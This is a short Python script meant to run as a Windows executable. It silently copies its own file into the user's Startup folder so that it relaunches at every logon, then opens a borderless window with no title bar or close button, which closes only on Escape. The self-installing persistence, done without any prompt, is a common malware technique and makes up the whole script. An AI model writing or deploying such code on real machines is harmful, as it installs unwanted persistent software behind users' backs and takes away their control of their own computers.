import os
import shutil
import sys
from tkinter import *

current_exe_path = sys.executable 

startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startup_exe_path = os.path.join(startup_folder, os.path.basename(current_exe_path))

if not os.path.exists(startup_exe_path):
    try:
        shutil.copy2(current_exe_path, startup_exe_path)
        print("Copied to startup folder.")
    except Exception as e:
        print("Failed to copy to startup folder:", e)

root = Tk()
root.geometry("600x600")
root.overrideredirect(True)  

root.bind("<Escape>", lambda e: root.destroy())

root.mainloop()
